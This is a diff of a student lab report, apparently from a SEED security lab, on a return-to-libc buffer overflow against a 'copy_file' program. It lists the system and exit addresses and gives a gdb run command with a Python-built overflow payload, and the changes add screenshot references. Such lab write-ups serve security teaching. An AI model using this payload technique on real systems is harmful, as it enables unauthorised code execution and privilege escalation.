@@ -73,6 +73,8 @@ The stack frame of main function
 The pwd of the copy_file: 
 ![alt text](image-40.png)
 Create a global environment varibale using `export my_path="/home/seed/seclabs/copy_file"`
+Then i will set root for user to write:
+![alt text](image-50.png)
 I will find the address of system and exit and that string of varibale:
 ![alt text](image-41.png)
 Address value of system: 0xf7e50db0 will be inserted with format \xb0\x0d\xe5\xf7
@@ -83,10 +85,11 @@ Address value of the string of env: 0xffffd94c will be inserted with format \x4c
 
 So the command will be:
 `r $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x4c\xd9\xff\xff')")`
+Before i run this command:
+![alt text](image-51.png)
+And the output when i run this command: 
 
-And the output: 
-
-error
+![alt text](image-49.png)
 
 
 
